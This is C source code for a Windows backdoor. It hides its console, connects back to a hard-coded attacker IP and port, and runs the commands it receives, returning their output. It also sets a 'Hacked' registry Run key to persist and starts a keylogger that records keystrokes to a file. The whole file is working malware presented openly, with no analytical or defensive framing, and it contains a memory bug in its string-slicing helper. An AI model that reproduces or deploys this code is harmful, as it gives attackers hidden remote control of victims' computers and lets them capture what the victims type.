#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdbool.h>
//#include "keylogger.h"

int sock;

DWORD WINAPI logg()
{
	int result, keys;
    FILE *fp;

    fp = fopen("windows.txt", "a");

    while (true) {
        for (keys = 64; keys <= 90; keys++) {
            sleep(1);

            result = GetAsyncKeyState(keys);

            if (result == -32767) {
                fprintf(fp, "%c", keys);
            }
        }
    }
}


char *strslice(const char *str, size_t start, size_t end)
{
	if (start > end) {
		return NULL;
	}
	char *result;
    strncpy(result, str + start, end - start);
	return result;
}

int bootRun()
{
	char err[128] = "Failed\n";
	char success[128] = "Created persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH]; // Win32 char string (MAX_PATH = 256)
	DWORD pathLen = 0; // double word - unsigned 32-bit int

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH); // returns the path of the malware
	if (pathLen == 0) { 
		send(sock, err, sizeof(err), 0);
		return -1;
	}

	HKEY NewVal; // opens windows registry and creates new entry
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, success, sizeof(success), 0);
	return 0;
}

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (true)
	{
		jump:
		memset(buffer, 0, sizeof(buffer));
		memset(container, 0, sizeof(container));
		memset(total_response, 0, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0); // receives command

		if (strncmp("q", buffer, 1) == 0)
		{					   // exit command
			closesocket(sock); // closes socket
			WSACleanup();	   // windows cleanup
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3) == 0) 
		{
			chdir(strslice(buffer, 3, 100)); // removes first 3 chars from buffer
		}
		else if (strncmp("persist", buffer, 7) == 0)
		{
			bootRun(); // create persistence registry entry
		}
		else if (strncmp("keylog_start", buffer, 12) == 0)
		{
			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL); // start keylogging thread
			goto jump;
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r"); // executes command
			while (fgets(container, sizeof(container), fp) != NULL)
			{									   // stores response on container
				strcat(total_response, container); // concatenates response
			}
			send(sock, total_response, sizeof(total_response), 0); // sends response
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); // Finds user current window
	ShowWindow(stealth, 0);							   // runs on background

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "192.168.0.99"; // IP address from attacker (ifconfig - inet)
	ServPort = 50005;		 // Listening port

	if ((WSAStartup(MAKEWORD(2, 0), &wsaData)) != 0)
	{
		exit(1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	while (true)
	{
		if (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
		{
			sleep(10);
		}
		else
		{
			break;
		}
	}
	Shell();
}